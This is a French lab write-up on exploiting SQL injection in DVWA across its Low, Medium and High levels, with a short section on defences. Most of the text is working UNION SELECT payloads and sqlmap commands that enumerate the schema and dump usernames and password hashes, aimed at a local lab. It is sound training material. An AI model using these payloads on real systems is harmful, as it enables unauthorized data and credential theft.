# DVWA - SQL Injection

## Objectif

Le module SQL Injection de DVWA sert à comprendre comment une entrée utilisateur injectée dans une requête SQL peut modifier la logique de la requête et exposer des données sensibles.

L’objectif du write-up est de montrer l’exploitation progressive sur les niveaux Low, Medium et High, puis d’illustrer les contre-mesures à appliquer en production.

## Contexte

DVWA permet de tester plusieurs formes de SQLi sur un paramètre de type `id`, avec des résultats visibles directement dans la page web.

Le module est adapté à l’apprentissage de la détection d’injection, de l’énumération de colonnes, de l’usage de `UNION SELECT` et de l’extraction de données depuis les tables du schéma `dvwa`.

## Niveau Low

Au niveau Low, la requête est généralement construite de manière vulnérable avec une concaténation directe de l’entrée utilisateur.

Cela permet de tester rapidement si le paramètre `id` accepte des caractères spéciaux et si la requête peut être détournée.

### Détection

La première étape consiste à vérifier si le paramètre est injectable avec un simple apostrophe, puis à observer la réponse de l’application.

Si l’application renvoie une erreur SQL ou un comportement anormal, la présence d’une injection devient probable.

Ensuite, il faut identifier le nombre de colonnes utilisées par la requête avec `ORDER BY`, puis confirmer une injection exploitable avec `UNION SELECT`.

Cette phase permet de comprendre la structure attendue par la requête et d’ajuster le payload au format exact renvoyé par la page.

Commencer par des tests simples :

```text
1'
```

```text
1' ORDER BY 1#
```

```text
1' ORDER BY 2#
```

```text
1' ORDER BY 3#
```

Si `ORDER BY 3` provoque une erreur mais pas `ORDER BY 1` ni `ORDER BY 2`, cela indique que la requête retourne probablement 2 colonnes.

### Validation avec UNION

Tester ensuite une injection UNION :

```text
1' UNION SELECT NULL,NULL#
```

Puis vérifier quelles colonnes sont affichées à l’écran :

```text
1' UNION SELECT database(),user()#
```

### Énumération des tables

```text
1' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='dvwa'#
```

### Énumération des colonnes

```text
1' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'#
```

Tu peux aussi préciser le schéma :

```text
1' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_schema='dvwa' AND table_name='users'#
```

### Énumération

Une fois la structure comprise, l’énumération passe généralement par `information_schema.tables` pour retrouver les tables du schéma cible, puis par `information_schema.columns` pour identifier les colonnes intéressantes.

Dans DVWA, la table `users` est souvent la cible principale pour démontrer l’extraction de noms d’utilisateurs et de mots de passe.

```text
1' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'#
```

```text
1' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_schema='dvwa' AND table_name='users'#
```

### Extraction

Quand les colonnes sont connues, le payload `UNION SELECT` permet d’afficher les champs utiles directement dans la page.

Le write-up doit montrer comment passer d’un test de vulnérabilité à une extraction de données complète, sans s’arrêter à la simple preuve de concept.

Une fois les colonnes utiles identifiées :

```text
1' UNION SELECT user,password FROM users#
```

Selon la structure exacte de la page, tu peux aussi afficher d’autres colonnes :

```text
1' UNION SELECT first_name,last_name FROM users#
```

```text
1' UNION SELECT user,avatar FROM users#
```

## Niveau Medium

Au niveau Medium, DVWA introduit une première mitigation, mais celle-ci reste insuffisante si l’entrée est encore transformée de façon fragile avant d’être utilisée dans la requête.

Le but du niveau est de montrer qu’un filtrage ou un échappement mal appliqué ne remplace pas une vraie protection par requêtes paramétrées.

### Approche

La méthode consiste à réutiliser la même logique de test que sur Low, mais en observant quelles transformations sont appliquées par l’application avant l’exécution SQL.

Selon la version et la configuration, il peut être nécessaire d’ajuster la syntaxe du payload pour contourner un échappement partiel ou un filtrage naïf.

### Idée clé

Ce niveau est idéal pour expliquer qu’un mécanisme de défense n’est pas fiable s’il repose uniquement sur l’échappement ou sur une validation incomplète.

Une protection sérieuse doit empêcher l’utilisateur de modifier la structure de la requête, pas seulement masquer certains caractères.

À ce niveau, il est souvent inutile d’utiliser un guillemet si le paramètre est traité comme numérique.

On peut donc tester directement :

```text
1 ORDER BY 1#
```

```text
1 ORDER BY 2#
```

```text
1 ORDER BY 3#
```

Puis valider l’injection avec :

```text
1 UNION SELECT NULL,NULL#
```

Identifier les colonnes visibles :

```text
1 UNION SELECT database(),user()#
```

### Énumération (medium)

```text
1 UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='dvwa'#
```

```text
1 UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_schema='dvwa' AND table_name='users'#
```

### Extraction (medium)

```text
1 UNION SELECT user,password FROM users#
```

Le niveau Medium peut nécessiter l’usage de Burp Suite selon la façon dont le paramètre est envoyé, mais la logique des payloads reste globalement la même.

## Niveau High

Au niveau High, l’application attend une approche plus précise, avec une logique d’énumération plus méthodique et un contexte de requête plus contraint.

Le write-up doit montrer que la vulnérabilité existe encore, mais que la chaîne d’exploitation devient plus discrète et demande davantage d’analyse.

Le payload reste souvent similaire au niveau Medium, mais il faut d’abord identifier le bon point d’entrée.

Commencer par :

```text
1 ORDER BY 1#
```

```text
1 ORDER BY 2#
```

```text
1 ORDER BY 3#
```

Valider ensuite :

```text
1 UNION SELECT NULL,NULL#
```

Afficher des informations de contexte :

```text
1 UNION SELECT database(),user()#
```

### Énumération (high)

```text
1 UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='dvwa'#
```

```text
1 UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_schema='dvwa' AND table_name='users'#
```

### Extraction (high)

```text
1 UNION SELECT user,password FROM users#
```

Au niveau High, il faut souvent passer par l’interface “change ID” ou par une requête spécifique avant que le résultat soit renvoyé dans la page principale. Le payload peut rester identique, mais le workflow applicatif change.

### Approche SQLI

La séquence classique reste la même :

1. Identifier le point d’injection.
2. Comprendre la forme de la requête.
3. Tester le nombre de colonnes.
4. Adapter la charge utile à la structure attendue.

Le niveau High est intéressant pour illustrer la différence entre protection superficielle et véritable sécurisation côté serveur.

### Lecture défensive

Ce niveau permet aussi d’introduire les bonnes pratiques de prévention : l’usage de requêtes préparées, la validation par liste blanche et le principe du moindre privilège côté base de données.

Ces mesures réduisent fortement l’impact d’une erreur de développement ou d’un point d’entrée mal maîtrisé.

## Impact

Une SQL Injection réussie peut permettre de lire, modifier ou supprimer des données, mais aussi de contourner une authentification ou d’atteindre d’autres composants de l’application.

Dans un environnement de laboratoire comme DVWA, elle sert surtout à montrer la chaîne complète entre un champ vulnérable et l’extraction de données sensibles.

## Bonnes pratiques

- Utiliser des requêtes préparées avec paramètres liés, afin d’empêcher l’utilisateur de changer l’intention de la requête.
- Ajouter une validation stricte par liste blanche lorsque le type de donnée est connu à l’avance.
- Limiter les privilèges du compte base de données utilisé par l’application.
- Éviter de dépendre uniquement de l’échappement des chaînes comme mécanisme de défense principal.

---

## SQLMap

SQLMap permet d’automatiser la détection et l’exploitation de l’injection SQL sur DVWA.

Avant de lancer les commandes, il faut :

- être authentifié sur DVWA ;
- récupérer les cookies de session ;
- vérifier que le niveau de sécurité est bien celui attendu ;
- utiliser uniquement le lab local ou un environnement autorisé.

### Exemple de base

```bash
sqlmap -u "http://127.0.0.1:42001/vulnerabilities/sqli/?id=1&Submit=Submit#" \
  --cookie="PHPSESSID=TONSESSID; security=low" \
  -p id
```

Cette première commande permet à sqlmap de tester le paramètre `id` et de déterminer s’il est injectable.

### Énumération des bases

```bash
sqlmap -u "http://127.0.0.1:42001/vulnerabilities/sqli/?id=1&Submit=Submit#" \
  --cookie="PHPSESSID=TONSESSID; security=low" \
  -p id \
  --dbs
```

### Énumération des tables de la base dvwa

```bash
sqlmap -u "http://127.0.0.1:42001/vulnerabilities/sqli/?id=1&Submit=Submit#" \
  --cookie="PHPSESSID=TONSESSID; security=low" \
  -p id \
  -D dvwa \
  --tables
```

### Énumération des colonnes de la table users

```bash
sqlmap -u "http://127.0.0.1:42001/vulnerabilities/sqli/?id=1&Submit=Submit#" \
  --cookie="PHPSESSID=TONSESSID; security=low" \
  -p id \
  -D dvwa \
  -T users \
  --columns
```

### Dump des données

```bash
sqlmap -u "http://127.0.0.1:42001/vulnerabilities/sqli/?id=1&Submit=Submit#" \
  --cookie="PHPSESSID=TONSESSID; security=low" \
  -p id \
  -D dvwa \
  -T users \
  -C user,password \
  --dump
```

### Variante avec fichier de requête

Passer par Burp Suite pour intercepter la requête, l’enregistrer dans un fichier texte requete.txt puis lancer :

```bash
sqlmap -r requete.txt -p id --dbs
```

Cette méthode est souvent plus fiable lorsque le workflow de l’application est moins direct ou quand plusieurs paramètres doivent être conservés exactement.

### Remarques

- En niveau Low, sqlmap fonctionne généralement de manière directe.
- En niveau Medium ou High, il peut être nécessaire d’adapter la requête, le cookie ou le mode d’envoi.
- L’automatisation avec sqlmap ne remplace pas l’analyse manuelle ; elle complète le travail fait avec `ORDER BY`, `UNION SELECT` et l’étude du comportement de l’application.

## Ressources

- [DEMO SQLI DVWA](https://www.youtube.com/watch?v=t6Fa3V7tR8g)
- [DEMO SQLI DVWA](https://www.youtube.com/watch?v=5bj1pFmyyBA)
- [SQLI DVWA](https://github.com/kashrathod19/SQL-Injection-DVWA-SOLUTION)
- [DEMO SQLI DVWA](https://github.com/dev-angelist/Writeups-and-Walkthroughs/blob/main/dvwa/sql-injection.md)
- [CHEAT SHEET SQLI DVWA](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [CHEAT SHEET PREVENTION SQLI DVWA](https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html)
- [PRESENTATION SQLI DVWA](https://www.scribd.com/document/959031173/11-1-SQL-Injection-DVWA-Medium-High)
- [TUTORIEL SQLI DVWA](https://www.scribd.com/presentation/817488912/SQL-Injection)